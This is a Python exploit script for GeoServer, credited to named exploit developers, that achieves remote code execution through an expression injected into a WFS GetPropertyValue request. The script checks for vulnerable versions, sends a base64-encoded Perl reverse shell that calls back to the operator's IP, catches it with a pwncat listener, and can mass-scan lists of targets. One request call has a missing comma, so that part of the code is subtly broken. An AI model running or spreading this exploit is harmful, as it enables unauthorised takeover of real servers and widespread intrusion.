#!/usr/bin/env python3

import re
import base64
import socket
import requests
import threading
import pwncat
import rich_click as click
import xml.etree.ElementTree as ET
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor

disable_warnings(InsecureRequestWarning)

class GeoServerExploit:
    def __init__(
        self,
        url: str,
        remote_ip: str,
        remote_port: int,
        bind_host: str = None,
        bind_port: int = None,
        proxy: dict = None,
        threads: int = 1,
    ):
        self.url = url
        self.remote_ip = remote_ip
        self.remote_port = remote_port
        self.bind_host = bind_host if bind_host is not None else remote_ip
        self.bind_port = bind_port if bind_port is not None else remote_port
        self.proxy = proxy
        self.threads = threads
        self.payload_delivered = False

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        header_color = header_colors.get(header, "white")
        formatted_message = click.style(
            f"[{header}] ", fg=header_color, bold=True
        ) + click.style(message, bold=True, fg="white")
        click.echo(formatted_message)

    def detect_version(self):
        vulnerable_versions = ["2.23.2", "2.23.6", "2.24.0", "2.24.3", "2.25.0"]
        version_path = "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage"
        full_url = self.url + version_path

        try:
            response = requests.get(full_url, timeout=10, verify=False, allow_redirects=True)
            response.raise_for_status()
        except requests.RequestException:
            return False

        version_pattern = re.compile(r'<span\s+id="version">([\d\.]+)</span>', re.IGNORECASE)
        match = version_pattern.search(response.text)

        if match:
            version = match.group(1)
            if version in vulnerable_versions:
                self.custom_print(f"{self.url} vulnerable GeoServer version detected: {version}", "+")
                return True
        return False

    def construct_command(self):
        cmd = (
            f'perl -e \'use Socket;$i="{self.remote_ip}";$p={self.remote_port};'
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            'exec("/bin/bash -i");};\''
        )
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        bash_command = f"sh -c echo${{IFS}}{cmd_b64}|base64${{IFS}}-d|sh"
        return bash_command

    def fetch_feature_types(self):
        feature_types = []
        try:
            response = requests.get(
                f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0",
                proxies=self.proxy,
                timeout=10
                verify=False
            )
            if response.status_code == 200:
                tree = ET.fromstring(response.content)
                namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                feature_types = [
                    elem.text
                    for elem in tree.findall(".//wfs:ReturnFeatureType", namespaces)
                ]
                self.custom_print(
                    f"Fetched {len(feature_types)} feature types successfully.", "+"
                )
                for feature in feature_types:
                    self.custom_print(feature, "+")
                self.custom_print(f"Attempting exploit with object types", "!")
            else:
                self.custom_print("Failed to fetch feature types from GeoServer.", "-")
        except Exception as e:
            self.custom_print(f"Error fetching feature types: {e}", "-")
        return feature_types

    def execute_exploit(self, object_type):
        command = self.construct_command()
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Connection": "close",
            "Content-Type": "application/xml",
        }
        payload = f"""
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
            xmlns:topp='http://www.openplans.org/topp'
            xmlns:fes='http://www.opengis.net/fes/2.0'
            xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='{object_type}'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{command}")</wfs:valueReference>
            </wfs:GetPropertyValue>
        """
        response = requests.post(
            full_url, headers=headers, data=payload, proxies=self.proxy, verify=False, timeout=10
        )
        if response.status_code == 400 and "NoApplicableCode" in response.text:
            self.custom_print("Exploit delivered successfully.", "+")
            self.payload_delivered = True
            return True
        return False

    def start_listener(self):
        with socket.create_server((self.bind_host, self.bind_port)) as listener:
            listener.settimeout(30)
            self.custom_print(f"Listening on {self.bind_host}:{self.bind_port}...", "*")
            try:
                client, addr = listener.accept()
                self.custom_print(f"Received connection from {addr[0]}:{addr[1]}", "+")
                with pwncat.manager.Manager() as manager:
                    manager.create_session(
                        platform="linux", protocol="socket", client=client
                    )
                    manager.interactive()
            except socket.timeout:
                self.custom_print(
                    "No reverse shell connection received within timeout.", "-"
                )

    def run(self):
        listener_thread = threading.Thread(target=self.start_listener)
        listener_thread.daemon = True
        listener_thread.start()

        feature_types = self.fetch_feature_types()
        for feature_type in feature_types:
            if self.payload_delivered:
                self.custom_print(
                    "Stopping further attempts since the payload was delivered successfully.",
                    "*",
                )
                listener_thread.join()
                break
            self.execute_exploit(feature_type)

    def scan_url(self, url):
        self.url = url
        if self.detect_version():
            self.run()

    def scan_urls_from_file(self, file_path):
        with open(file_path, 'r') as file:
            urls = [line.strip() for line in file.readlines()]

        with alive_bar(len(urls), title="Scanning URLs", bar='smooth', enrich_print=False) as bar:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self.scan_url, url): url for url in urls}
                for future in futures:
                    future.result()
                    bar()

@click.command()
@click.option("-u", "--url", required=False, help="Target URL")
@click.option("-ip", "--remote-ip", required=False, help="Your IP for reverse shell")
@click.option(
    "-port", "--remote-port", required=False, type=int, help="Port for reverse shell"
)
@click.option("-bind-host", help="Local bind host for the listener")
@click.option("-bind-port", type=int, help="Local bind port for the listener")
@click.option("--proxy", default=None, help="Proxy URL, e.g., http://localhost:8080")
@click.option("--check", default=None, help="File containing URLs to scan")
@click.option("--threads", default=1, type=int, help="The amount of threads to use for the scanner")
def main(url, remote_ip, remote_port, bind_host, bind_port, proxy, check, threads):
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    exploit = GeoServerExploit(
        url, remote_ip, remote_port, bind_host, bind_port, proxy_dict, threads
    )

    if check:
        exploit.scan_urls_from_file(check)
    else:
        exploit.run()

if __name__ == "__main__":
    click.echo(
        """
       _____   _____   ___ __ ___ _ _     ____  __ _ _   __  _
      / __\ \ / / __|_|_  )  \_  ) | | __|__ / / /| | | /  \/ |
     | (__ \ V /| _|___/ / () / /|_  _|___|_ \/ _ \_  _| () | |
      \___| \_/ |___| /___\__/___| |_|   |___/\___/ |_| \__/|_|

      Exploit Developers: Chocapikk, K3ysTr0K3R
    """
    )
    main()
